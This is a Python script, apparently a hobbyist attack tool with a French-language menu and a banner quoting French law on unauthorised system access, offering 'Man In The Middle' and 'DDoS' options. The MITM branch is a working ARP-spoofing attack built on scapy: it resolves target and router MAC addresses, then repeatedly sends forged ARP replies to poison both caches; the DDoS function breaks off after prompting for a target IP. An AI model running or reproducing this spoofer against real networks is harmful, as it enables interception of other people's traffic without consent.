import sys, os, time
import scapy.all as scapy
from colorama import Fore
from datetime import datetime


def attaque():
	print(Fore.RED+ "                          _______ _______       _____ _  __ \n"
				  + " ********************* /\|__   __|__   __|/\   / ____| |/ / *****************\n"
				  + " ******************** /  \  | |     | |  /  \ | |    | ' / ******************\n"
				  + " ******************* / /\ \ | |     | | / /\ \| |    |  < *******************\n"
				  + " ****************** / ____ \| |     | |/ ____ \ |____| . \ ******************\n"
				  + " ***************** /_/    \_\_|     |_/_/    \_\_____|_|\_\ *****************\n" + Fore.RESET + Fore.GREEN)


	f = input(		" Article 323-1 : Le fait d'accéder ou de se maintenir, frauduleusement,\n"
					" dans tout ou une partie d'un système de traitement automatisé de données\n"
					" est puni de deux ans d'emprisonnement et de 60 000 € d'amende\n\n"

					" 1- Man In The Middle (MITM)/!/Attention Attaque DDOS/!/\n"
					" 2- Attaque DDOS\n"
					" >: ")

	if f == "1":
		mitm()
	elif f == "2":
		ddos()

def mitm():

	target_ip = input(" Address IP de la cible : ")
	router_ip = input(" Address IP du router : ")
	target_mac = str(get_mac(target_ip))
	router_mac = str(get_mac(router_ip))

	try:
		while True:
			spoof(router_ip, target_ip, router_mac, target_mac)
			time.sleep(10)
	except KeyboardInterrupt:
		print('Closing ARP Spoofer.')
		exit(0)

def get_mac(ip):
	mac = "xx"
	while mac == "xx":
		try:
			arp_request = scapy.ARP(pdst=ip)
			broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
			arp_request_broadcast = broadcast/arp_request
			answered_list = scapy.srp(arp_request_broadcast, timeout=1 , verbose=False)[0]
			mac = answered_list[0][1].hwsrc 
		except:
			pass
		finally:
			return mac

def spoof(router_ip, target_ip, router_mac, target_mac):

	packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
	packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)

	scapy.send(packet1)
	scapy.send(packet2)



def ddos():
	target_ip = input(" Address IP de la cible : ")